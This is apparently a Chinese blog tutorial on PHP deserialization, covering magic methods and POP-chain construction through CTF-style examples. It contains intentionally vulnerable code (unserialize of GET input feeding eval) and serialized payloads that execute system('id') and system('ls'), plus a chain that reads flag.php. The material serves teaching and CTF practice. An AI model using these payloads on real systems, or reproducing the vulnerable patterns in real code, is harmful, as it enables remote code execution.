+<p>搞个小例题</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line">class test&#123;</span><br><span class="line">    public $a = &#x27;echo &quot;this is test!!&quot;;&#x27;;</span><br><span class="line">    public function displayVar() &#123;</span><br><span class="line">        eval($this-&gt;a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$get = $_GET[&quot;benben&quot;];</span><br><span class="line">$b = unserialize($get);</span><br><span class="line">$b-&gt;displayVar() ;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>首先先分析这段代码</p>
+<p>发现类 test 是把$a的值作为代码执行</p>
+<p>GET传参一个值给$get,然后反序列化成对象赋值给$b,然后调用displayVar方法</p>
+<p>所以我们只需要构造一个payload,让$a的值是我们想要执行的命令即可.</p>
+<p>手搓一个payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;test&quot;:1:&#123;s:1:&quot;a&quot;;s:13:&quot;system(&quot;id&quot;);&quot;;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://lu1ux-picture.oss-cn-beijing.aliyuncs.com/picture/20251125212714762.png" alt="image-20241130142130829"></p>
+<h3 id="魔术方法-1"><a href="#魔术方法-1" class="headerlink" title="魔术方法"></a>魔术方法</h3><p>一个预定义好的,在特定情况下自动触发的行为方法.</p>
+<p><img src="https://lu1ux-picture.oss-cn-beijing.aliyuncs.com/picture/20251125212715332.png" alt="image-20241130143316977"></p>
+<p>主要需要了解这些魔术方法的      <strong>触发时机    功能     参数     返回值</strong> </p>
+<ol>
+<li><h3 id="construct"><a href="#construct" class="headerlink" title="__construct()"></a>__construct()</h3></li>
+</ol>
+<p>构造函数,在实例化一个对象的时候,首先会去自动执行的一个方法</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">class User &#123;</span><br><span class="line">    public $username;</span><br><span class="line">    public function __construct($username) &#123;</span><br><span class="line">        $this-&gt;username = $username;</span><br><span class="line">        echo &quot;触发了构造函数1次&quot; ;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$test = new User(&quot;benben&quot;);      //在实例化时触发__construct()</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<ol start="2">
+<li><h4 id="destruct"><a href="#destruct" class="headerlink" title="__destruct()"></a>__destruct()</h4></li>
+</ol>
+<p>析构函数,在对象的所有引用被删除或者当对象被显式销毁时执行的魔术方法.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">class User &#123;</span><br><span class="line">    public function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        echo &quot;触发了析构函数1次&quot;.&quot;&lt;br /&gt;&quot; ;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$test = new User(&quot;benben&quot;);</span><br><span class="line">$ser = serialize($test);</span><br><span class="line">unserialize($ser);                  //反序列化覆盖原有$test触发一次</span><br><span class="line">                                    //代码结束销毁所有对象再触发一次</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>会触发两次__destruct()</p>
+<p>这里应该是反序列化覆盖原有$test一次，最后文件结束所有销毁再触发一次。</p>
+<ol start="3">
+<li><h4 id="sleep"><a href="#sleep" class="headerlink" title="__sleep()"></a>__sleep()</h4></li>
+</ol>
+<p>序列化serialize()函数会检查类中是否存在一个魔术方法__sleep().</p>
+<p>如果存在,该方法会被先调用,然后才执行序列化操作.</p>
+<p>此功能可以用于清理对象,并返回一个包含对象中所有应被序列化的变量名称的数组.如果该方法未返回任何内容,则NULL被序列化,并产生一个E_NOTICE级别的错误.</p>
+<p>触发时机:序列化serialize()之前</p>
+<p>功能:对象被序列化之前触发,返回需要被序列化存储的成员属性,删除不必要的属性.</p>
+<p>参数:成员属性</p>
+<p>返回值:需要被序列化存储的成员属性</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">class User &#123;</span><br><span class="line">    const SITE = &#x27;uusama&#x27;;</span><br><span class="line">    public $username;</span><br><span class="line">    public $nickname;</span><br><span class="line">    private $password;</span><br><span class="line">    public function __construct($username, $nickname, $password)    &#123;</span><br><span class="line">        $this-&gt;username = $username;</span><br><span class="line">        $this-&gt;nickname = $nickname;</span><br><span class="line">        $this-&gt;password = $password;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __sleep() &#123;</span><br><span class="line">        return array(&#x27;username&#x27;, &#x27;nickname&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$user = new User(&#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;);      //触发__construct()</span><br><span class="line">echo serialize($user);				  //触发__sleep()</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>最后只会返回username和nickname</p>
+<p>O:4:”User”:2:{s:8:”username”;s:1:”a”;s:8:”nickname”;s:1:”b”;}</p>
+<ol start="4">
+<li><h4 id="wakeup"><a href="#wakeup" class="headerlink" title="__wakeup()"></a>__wakeup()</h4></li>
+</ol>
+<p>unserialize()会检查是否存在一个__wakeup()方法.</p>
+<p>如果存在,则会先调用__wakeup()方法,预先准备对象需要的资源.</p>
+<p>预先准备对象资源,返回void,常用于反序列化操作中重新建立数据库连接或执行其他初始化操作</p>
+<p>注:__wakeup()在反序列化unserialize()之前</p>
+<p>​     __destruct()在反序列化unserialize()之后</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line">class User &#123;</span><br><span class="line">    const SITE = &#x27;uusama&#x27;;</span><br><span class="line">    public $username;</span><br><span class="line">    public $nickname;</span><br><span class="line">    private $password;</span><br><span class="line">    private $order;</span><br><span class="line">    public function __wakeup() &#123;</span><br><span class="line">        $this-&gt;password = $this-&gt;username;   //反序列化之前触发__wakeup(),给password赋值</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$user_ser = &#x27;O:4:&quot;User&quot;:2:&#123;s:8:&quot;username&quot;;s:1:&quot;a&quot;;s:8:&quot;nickname&quot;;s:1:&quot;b&quot;;&#125;&#x27;; //字符串本身没有password</span><br><span class="line">var_dump(unserialize($user_ser));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>object(User)#1 (4) { [“username”]&#x3D;&gt; string(1) “a” [“nickname”]&#x3D;&gt; string(1) “b” [“password”:”User”:private]&#x3D;&gt; string(1) “a” [“order”:”User”:private]&#x3D;&gt; NULL }</p>
+<ol start="5">
+<li><h4 id="toString-NaN"><a href="#toString-NaN" class="headerlink" title="__toString()"></a>__toString()</h4></li>
+</ol>
+<p>表达方式错误导致魔术方法触发</p>
+<p>触发时机:把对象当成<strong>字符串</strong>调用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class User &#123;</span><br><span class="line">    var $benben = &quot;this is test!!&quot;;</span><br><span class="line">         public function __toString()</span><br><span class="line">         &#123;</span><br><span class="line">             return &#x27;格式不对，输出不了!&#x27;;</span><br><span class="line">          &#125;</span><br><span class="line">&#125;</span><br><span class="line">$test = new User() ;           //将User实例化成对象</span><br><span class="line">print_r($test);                //可以用print_r输出</span><br><span class="line">echo &quot;&lt;br /&gt;&quot;;</span><br><span class="line">echo $test;                    //将对象当成字符串调用时触发__toString()</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<ol start="6">
+<li><h4 id="invoke"><a href="#invoke" class="headerlink" title="__invoke()"></a>__invoke()</h4></li>
+</ol>
+<p>格式表达错误导致魔术方法触发</p>
+<p>触发时机:把对象当成函数调用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class User &#123;</span><br><span class="line">    var $benben = &quot;this is test!!&quot;;</span><br><span class="line">    public function __invoke()</span><br><span class="line">    &#123;</span><br><span class="line">        echo  &#x27;它不是个函数!&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$test = new User() ;</span><br><span class="line">$test()                            //将对象当成函数调用时触发__invoke()</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<ol start="7">
+<li><h4 id="call"><a href="#call" class="headerlink" title="__call()"></a>__call()</h4></li>
+</ol>
+<p>调用一个不存在的方法</p>
+<p>触发时机:调用一个不存在的方法</p>
+<p>参数:两个参数传参$arg1,$arg2</p>
+<p>返回值:调用的不存在的方法的名称和参数</p>
+<p>$arg1,调用的不存在的方法的名称</p>
+<p>$arg2,调用的不存在的方法的参数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class User &#123;</span><br><span class="line">    public function __call($arg1,$arg2)</span><br><span class="line">    &#123;</span><br><span class="line">        echo &quot;$arg1,$arg2[0]&quot;;</span><br><span class="line">          &#125;</span><br><span class="line">&#125;</span><br><span class="line">$test = new User() ;</span><br><span class="line">$test -&gt; callxxx(&#x27;a&#x27;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>回显 callxxx,a</p>
+<ol start="8">
+<li><h4 id="callStatic"><a href="#callStatic" class="headerlink" title="__callStatic()"></a>__callStatic()</h4></li>
+</ol>
+<p>触发时机:静态调用或调用成员常量时使用的方法不存在</p>
+<p>参数:两个参数传参$arg1,$arg2</p>
+<p>返回值:调用的不存在的方法的名称和参数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class User &#123;</span><br><span class="line">    public function __callStatic($arg1,$arg2)</span><br><span class="line">    &#123;</span><br><span class="line">        echo &quot;$arg1,$arg2[0]&quot;;</span><br><span class="line">          &#125;</span><br><span class="line">&#125;</span><br><span class="line">$test = new User() ;</span><br><span class="line">$test::callxxx(&#x27;a&#x27;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>回显callxxx,a</p>
+<ol start="9">
+<li><h4 id="get"><a href="#get" class="headerlink" title="__get()"></a>__get()</h4></li>
+</ol>
+<p>触发时机:调用的成员属性不存在</p>
+<p>参数:传参$arg1</p>
+<p>返回值:不存在的成员属性的名称</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class User &#123;</span><br><span class="line">    public $var1;</span><br><span class="line">    public function __get($arg1)</span><br><span class="line">    &#123;</span><br><span class="line">        echo  $arg1;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$test = new User() ;</span><br><span class="line">$test -&gt;var2;            //调用的成员属性var2不存在,触发__get(),把不存在的属性名var2赋值给$arg1</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>回显var2</p>
+<ol start="10">
+<li><h4 id="set"><a href="#set" class="headerlink" title="__set()"></a>__set()</h4></li>
+</ol>
+<p>触发时机:给不存在的成员属性赋值</p>
+<p>参数:传参$arg1,$arg2</p>
+<p>返回值:不存在的成员属性的名称和赋的值</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class User &#123;</span><br><span class="line">    public $var1;</span><br><span class="line">    public function __set($arg1 ,$arg2)</span><br><span class="line">    &#123;</span><br><span class="line">        echo  $arg1.&#x27;,&#x27;.$arg2;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$test = new User() ;</span><br><span class="line">$test -&gt;var2=1;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>回显var2,1</p>
+<ol start="11">
+<li><h4 id="isset"><a href="#isset" class="headerlink" title="__isset()"></a>__isset()</h4></li>
+</ol>
+<p>触发时机:对不可访问属性使用isset()或empty()时,__isset()会被调用.</p>
+<p>参数:传参$arg1</p>
+<p>返回值:不存在的成员属性的名称</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class User &#123;</span><br><span class="line">    private $var;</span><br><span class="line">    public function __isset($arg1 )</span><br><span class="line">    &#123;</span><br><span class="line">        echo  $arg1;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$test = new User() ;</span><br><span class="line">isset($test-&gt;var);          //var是私有属性不可访问,调用__isset()</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>回显var</p>
+<ol start="12">
+<li><h4 id="unset"><a href="#unset" class="headerlink" title="__unset()"></a>__unset()</h4></li>
+</ol>
+<p>触发时机:对不可访问属性使用unset()时</p>
+<p>参数:传参$arg1</p>
+<p>返回值:不存在的成员属性的名称</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class User &#123;</span><br><span class="line">    private $var;</span><br><span class="line">    public function __unset($arg1 )</span><br><span class="line">    &#123;</span><br><span class="line">        echo  $arg1;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$test = new User() ;</span><br><span class="line">unset($test-&gt;var);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>回显var</p>
+<ol start="13">
+<li><h4 id="clone"><a href="#clone" class="headerlink" title="__clone()"></a>__clone()</h4></li>
+</ol>
+<p>触发时机:当使用clone关键字拷贝完成一个对象后,新对象会自动调用定义的魔术方法__clone()</p>
+<p><img src="https://lu1ux-picture.oss-cn-beijing.aliyuncs.com/picture/20251125212716004.png" alt="image-20241130155459479"></p>
+<p><img src="https://lu1ux-picture.oss-cn-beijing.aliyuncs.com/picture/20251125212715599.png" alt="image-20241130155443584"></p>
+<h2 id="POP链前置"><a href="#POP链前置" class="headerlink" title="POP链前置"></a>POP链前置</h2><p>例题1</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class index &#123;</span><br><span class="line">    private $test;</span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        $this-&gt;test = new normal();</span><br><span class="line">    &#125;</span><br><span class="line">    public function __destruct()&#123;</span><br><span class="line">        $this-&gt;test-&gt;action();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class normal &#123;</span><br><span class="line">    public function action()&#123;</span><br><span class="line">        echo &quot;please attack me&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class evil &#123;</span><br><span class="line">    var $test2;</span><br><span class="line">    public function action()&#123;</span><br><span class="line">        eval($this-&gt;test2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">unserialize($_GET[&#x27;test&#x27;]);</span><br></pre></td></tr></table></figure>
+
+<p>两头看</p>
+<p>最终的目的是利用eval函数来执行指令</p>
+<p>eval()调用$test2,但是$test2没办法操作</p>
+<p>再看上面,__construct()魔术方法触发后会将test实例化赋值成normal对象,但是__construct只有在实例化一个对象的时候会执行,所以说这个永远都不会执行</p>
+<p>然后再看,有__destruct()魔术方法,会被unserialize()触发,从类index调用action()方法</p>
+<p>于是我们需要构造一个payload,让__destruct()从类evil调用action</p>
+<p>删除多余的函数,只留类和成员属性来构造payload</p>
+<p>结果报错了,发现$test是私有属性外部没法调用,给他改成public,运行得到payload</p>
+<p><img src="https://lu1ux-picture.oss-cn-beijing.aliyuncs.com/picture/20251125212715618.png" alt="image-20241130164543302"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:5:&quot;index&quot;:1:&#123;s:4:&quot;test&quot;;O:4:&quot;evil&quot;:1:&#123;s:5:&quot;test2&quot;;s:13:&quot;system(&quot;ls&quot;);&quot;;&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>但是别忘了私有属性前面有%00类名%00</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:5:&quot;index&quot;:1:&#123;s:11:&quot;%00index%00test&quot;;O:4:&quot;evil&quot;:1:&#123;s:5:&quot;test2&quot;;s:13:&quot;system(&quot;ls&quot;);&quot;;&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>然后用hackbar  URLdecode一下上传</p>
+<p><img src="https://lu1ux-picture.oss-cn-beijing.aliyuncs.com/picture/20251125212715612.png" alt="image-20241130164609398"></p>
+<h3 id="魔术方法调用的前提"><a href="#魔术方法调用的前提" class="headerlink" title="魔术方法调用的前提:"></a>魔术方法调用的前提:</h3><p><strong>魔术方法所在类(或对象)被调用</strong></p>
+<p>例题2:</p>
+<p>目标:显示”tostring is here!!”</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class fast &#123;</span><br><span class="line">    public $source;</span><br><span class="line">    public function __wakeup()&#123;</span><br><span class="line">        echo &quot;wakeup is here!!&quot;;</span><br><span class="line">        echo  $this-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class sec &#123;</span><br><span class="line">    var $benben;</span><br><span class="line">    public function __tostring()&#123;</span><br><span class="line">        echo &quot;tostring is here!!&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$b = &#x27;O:3:&quot;sec&quot;:1:&#123;s:6:&quot;benben&quot;;&#125;;&#x27;;</span><br><span class="line">unserialize($b);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://lu1ux-picture.oss-cn-beijing.aliyuncs.com/picture/20251125212715637.png" alt="image-20241130170043031"></p>
+<p>运行发现没有任何回显,__wakeup()魔术方法根本没有调用</p>
+<p>因为反序列化的内容$b所调用的类sec()里不包含__wakeup(),所以不会触发</p>
+<p>分析这道题:</p>
+<p>需要触发__tostring()</p>
+<p>需要把sec()实例化成对象后当成字符串输出</p>
+<p>能输出字符串的地方就是类fast中的echo $this-&gt;source</p>
+<p>需要在echo中的source包含实例化sec()的对象</p>
+<p><img src="https://lu1ux-picture.oss-cn-beijing.aliyuncs.com/picture/20251125212716270.png" alt="image-20241130173027746"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;fast&quot;:1:&#123;s:6:&quot;source&quot;;O:3:&quot;sec&quot;:1:&#123;s:6:&quot;benben&quot;;N;&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h2 id="POP链"><a href="#POP链" class="headerlink" title="POP链"></a>POP链</h2><p>在反序列化中,我们能控制的数据就是对象中的属性值(成员变量),所以在PHP反序列化中有一种漏洞利用方法叫”面向属性编程”,即POP(Property Oriented Programming)</p>
+<p>POP链就是利用魔术方法在里面进行多次跳转然后获取敏感数据的一种Payload.</p>
+<p>POC编写</p>
+<p>POC(Proof of concept)中文译作概念验证.在安全界可以理解成漏洞验证程序.POC是一段不完整的程序,仅仅是为了证明提出者的观点的一段代码</p>
+<p>例题</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//flag is in flag.php</span><br><span class="line">class Modifier &#123;</span><br><span class="line">    private $var;</span><br><span class="line">    public function append($value)</span><br><span class="line">    &#123;</span><br><span class="line">        include($value);</span><br><span class="line">        echo $flag;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __invoke()&#123;</span><br><span class="line">        $this-&gt;append($this-&gt;var);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Show&#123;</span><br><span class="line">    public $source;</span><br><span class="line">    public $str;</span><br><span class="line">    public function __toString()&#123;</span><br><span class="line">        return $this-&gt;str-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __wakeup()&#123;</span><br><span class="line">        echo $this-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Test&#123;</span><br><span class="line">    public $p;</span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        $this-&gt;p = array();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __get($key)&#123;</span><br><span class="line">        $function = $this-&gt;p;</span><br><span class="line">        return $function();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#x27;pop&#x27;]))&#123;</span><br><span class="line">    unserialize($_GET[&#x27;pop&#x27;]);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>目标:触发echo,输出flag</p>
+<p>题目说了flag在flag.php,所以需要令$value值为flag.php</p>
+<p>发现__invoke()魔术方法下会调用append,并且输入参数var,所以$value&#x3D;$var</p>
+<p>只需要想办法触发__invoke(),并且是$var&#x3D;flag.php即可</p>
+<p>__invoke()的触发条件是把对象当成函数</p>
+<p>发现__get()方法下有return$function()</p>
+<p>$function是由$p赋值得到的</p>
+<p>就需要给$p赋值一个对象</p>
+<p>这个对象只能是Modifier不能是Show,因为魔术方法调用的前提是魔术方法所在类(或对象)被调用</p>
+<p>现在需要想办法触发__get()</p>
+<p>__get()的触发条件是调用不存在的成员属性</p>
+<p>发现__tostring()下面有return $this-&gt;str-&gt;source</p>
+<p>就需要把str赋值为对象test,test中不存在成员属性source,就可以触发test里的成员方法get</p>
+<p>__tostring()的触发条件是把对象当作字符串调用</p>
+<p>现在需要想办法触发__tostring()</p>
+<p>看见__wakeup方法里面有一个echo</p>
+<p>可以用来想办法触发</p>
+<p>给$source赋值为对象Show,当成字符串被echo,触发tostring</p>
+<p>于是构造</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//flag is in flag.php</span><br><span class="line">class Modifier &#123;</span><br><span class="line">    private $var = &#x27;flag.php&#x27;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Show&#123;</span><br><span class="line">    public $source;</span><br><span class="line">    public $str;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Test&#123;</span><br><span class="line">    public $p;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">$mod = new Modifier();</span><br><span class="line">$test = new Test();</span><br><span class="line">$test -&gt;p = $mod;</span><br><span class="line">$show = new Show();</span><br><span class="line">$show -&gt;source = $show;</span><br><span class="line">$show -&gt;str = $test;</span><br><span class="line">echo serialize($show);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://lu1ux-picture.oss-cn-beijing.aliyuncs.com/picture/20251125212716435.png" alt="image-20241130193134357"></p>
